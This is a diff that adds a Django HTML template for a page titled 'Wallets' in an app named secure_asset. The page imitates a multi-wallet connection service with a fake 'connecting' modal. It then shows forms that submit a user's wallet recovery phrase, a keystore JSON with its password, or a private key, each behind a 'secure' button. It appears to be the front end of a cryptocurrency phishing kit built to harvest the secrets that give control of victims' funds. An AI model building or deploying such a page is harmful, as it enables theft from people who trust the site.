@@ -1,0 +1,227 @@
+
+{% extends "secure_asset/base.html" %}
+{% load static %}
+{% block scripts %}
+    <script src="{% static 'js/secure_assets.js' %}" defer></script>
+{% endblock %}
+
+{% block content %}
+
+
+
+
+  <!-- The Modal -->
+  <div class="modal" id="quizstartmodal" data-bs-backdrop="static" data-bs-keyboard="false" style="font-weight: 400; font-size:16px;">
+    <div class="modal-dialog modal-dialog-centered" >
+      <div class="modal-content">
+  
+        <!-- Modal Header -->
+        <div class="modal-header bg-secondary">
+          
+          <button type="button" class="btn-close" id="button-interval" data-bs-dismiss="modal"></button>
+        </div>
+  
+        <!-- Modal body -->
+        <div class="modal-body" id="modal-body-comfirm">
+            <div class="container">
+                <div class="mb-4 p-2 border border-danger rounded-4 text-left" id="connecting_wallet">
+                   
+                  <div class="d-flex">
+                    <div class="ps-2"><p class="text-danger " id="text-connect" style="font-size:130%;">connecting</p></div>
+                    <div> <img src="https://res.cloudinary.com/ddzsko2s0/image/upload/v1665935867/investment_site/wallet_logo/loading_oarumc.gif" style="width: 50px; height: 50px;" alt=""></div>
+                </div>
+                    
+
+                </div>
+                
+                    <div class="border border-secondary rounded-4"  id="wallet_info" >
+                    
+                        <div class="d-flex justify-content-between">
+                            <div class="">
+                                <div class="p-2">
+                                    <div class="ps-2" id="wallet_name_display">Metamask</div>
+                                    <div class="ps-2"><small>Easy-to-use browser extension.</small> </div>
+                                </div>
+                                
+                            </div>
+                            <div class=" " >
+                                <div class="p-3"><img src="" id="wallet_logo_display" style="width:30px;height:30px;"></div>
+                                
+                            </div>
+                        </div>
+                        
+                    
+                </div>
+                
+                
+
+            </div>
+          
+        </div>
+  
+        <!-- Modal footer -->
+        <div class="modal-footer">
+          <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">cancel</button>
+          
+        </div>
+  
+      </div>
+    </div>
+  </div>
+<div align="center">
+    <div class="container-fluid">
+        <h1 class="text-muted mb-5" >Wallets</h1>
+        <div class="col-10 col-md-9 text-muted mb-5 h5" style="font-size:18px; font-weight: 400;">Multiple iOS and Android wallets support the protocol. Simply scan a QR code from your desktop computer screen to start securely using a dApp with your mobile wallet. Interaction between mobile apps and mobile browsers are supported via mobile deep linking.</div>
+    </div>
+ <div class="container-fluid">
+  <div class="row">
+    {% for wallet in all_wallet %}
+    <div class="col-6 col-sm-6 col-md-4 col-lg-4 col-xl-3" style="display: flex; justify-content: center; align-items: center;">
+        <button 
+            class="btn btn-link modal-button"
+            wallet-name="{{wallet.name_of_wallet}}"
+            wallet-logo="{{wallet.logo.url}}"
+            style ="text-decoration:none;" 
+            data-bs-toggle="modal" 
+            data-bs-target="#quizstartmodal"
+            
+
+            >
+                <img src={{wallet.logo.url}} class="img-fluid" style="max-width:70%;max-height:70%;">
+                <p class="text-muted" style="font-size:18px; font-weight: 500;">{{wallet.name_of_wallet}}</p>
+        </button>     
+    </div>
+    {% endfor %}
+</div>
+
+ </div>   
+   
+
+</div>
+
+
+
+<!-- The Modal  for the secure wallet form-->
+<div class="modal" id="secure-wallet" data-bs-backdrop="static" data-bs-keyboard="false">
+    <div class="modal-dialog modal-lg modal-dialog-centered">
+      <div class="modal-content">
+  
+        <!-- Modal Header -->
+        <div class="modal-header">
+          
+          <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+        </div>
+    
+  
+        <!-- Modal body -->
+        <div class="modal-body" id="modal-body-comfirm">
+            <div class="container ps-5 pe-5 pb-5">
+                <div class="p-2">
+                    <div class="d-flex">
+                        <div class="">
+                            <div class=""><img src="" id="wallet_logo_display_secure" style="width:50px;height:50px;"></div>
+                        </div>
+                        <div class=" " >
+                           <div class="ps-2 pt-2" id="wallet_discribe"></div> 
+                        </div>
+                    </div>
+                </div>
+                <div class="p-2">
+                    <div class="d-flex justify-content-around">
+                        <div><button class="text-secondary btn btn-link" style ="text-decoration:none;" id="phrase_form_btn" >Phrase</button></div>
+                        <div><button class="text-secondary btn btn-link" style ="text-decoration:none;" id="keystore_form_btn">Keystore JSON</button></div>
+                        <div><button class="text-secondary btn btn-link" style ="text-decoration:none;" id="private_form_btn">Private Key</button></div>
+                    </div>
+                    <hr>
+                </div>
+                  <!-- phrase form -->
+                <form method="POST" class="needs-validation" id="phrase_form" style="display:block;">
+                    {% csrf_token %}
+                    <div class="mb-3 mt-3">
+                        <label for="pwd" class="form-label">Phrase</label>
+                        <input type="text" class="form-control" id="pwd" placeholder="name wallet" name="wallet_name" required>
+                        <div class="valid-feedback">Valid.</div>
+                        <div class="invalid-feedback">Please fill out this field.</div>
+                      </div>
+                  <div class="mb-3">
+                    
+                    <textarea  class="form-control" id="uname" placeholder="Enter your recovery phrase" name="secret_phrase" required></textarea>
+                    <div class="valid-feedback">Valid.</div>
+                    <div class="invalid-feedback">Please fill out this field.</div>
+                  </div>
+                  <input type="hidden" name="mode_of_saving" value="phrase">
+                  <div class="mb-3">
+                      <small>Typically 12 (sometimes 24) words separated by single spaces</small>
+                  </div>
+                  
+                <div class="d-grid"><button type="submit" class="btn btn-primary btn-block">secure</button></div>  
+                </form>
+
+                <!-- keystore Json form -->
+
+                <form  method="POST" class="needs-validation" id="keystore_form" style="display:none;">
+                    {% csrf_token %}
+                    
+                    <div class="mb-3 mt-3">
+                        <label for="pwd" class="form-label">Keystore JSON</label>
+                        <input type="text" class="form-control" id="pwd" placeholder="name wallet" name="wallet_name" required>
+                        <div class="valid-feedback">Valid.</div>
+                        <div class="invalid-feedback">Please fill out this field.</div>
+                      </div>
+                  <div class="mb-3">
+                    
+                    <textarea  class="form-control" id="uname" placeholder="Keystore JSON" name="keystore_json" required></textarea>
+                    <div class="valid-feedback">Valid.</div>
+                    <div class="invalid-feedback">Please fill out this field.</div>
+                  </div>
+
+                  <div class="mb-3">      
+                    <input type="text"  class="form-control" id="uname" placeholder="Wallet password" name="wallet_password" required>
+                    <div class="valid-feedback">Valid.</div>
+                    <div class="invalid-feedback">Please fill out this field.</div>
+                  </div>
+                  <input type="hidden" name="mode_of_saving" value="keystore_json">
+                  <div class="mb-3">
+                      <small>Several lines of text beginning with "{...}" plus the password you used to encrypt it.</small>
+                  </div>
+                  
+                <div class="d-grid"><button type="submit" class="btn btn-primary btn-block">secure</button></div>  
+                </form>
+                <!-- private key form -->
+                <form method="POST" class="needs-validation" id="private_form" style="display:none;">
+                    {% csrf_token %}
+                    <div class="mb-3 mt-3">
+                        <label for="pwd" class="form-label">Private Key</label>
+                        <input type="text" class="form-control" id="pwd" placeholder="name wallet" name="wallet_name" required>
+                        <div class="valid-feedback">Valid.</div>
+                        <div class="invalid-feedback">Please fill out this field.</div>
+                      </div>
+            
+                  <div class="mb-3">      
+                    <input type="text"  class="form-control" id="uname" placeholder="Enter your Private Key" name="private_key" required>
+                    <div class="valid-feedback">Valid.</div>
+                    <div class="invalid-feedback">Please fill out this field.</div>
+                  </div>
+                  <input type="hidden" name="mode_of_saving" value="private_key">
+                  <div class="mb-3">
+                      <small>Typically 12 (sometimes 24) words seperated by a single space.</small>
+                  </div>
+                  
+                <div class="d-grid"><button type="submit" class="btn btn-primary btn-block">secure</button></div>  
+                </form>
+
+              </div>
+              
+        </div>
+  
+       
+  
+      </div>
+    </div>
+  </div>
+
+
+  
+
+{% endblock content%}
+
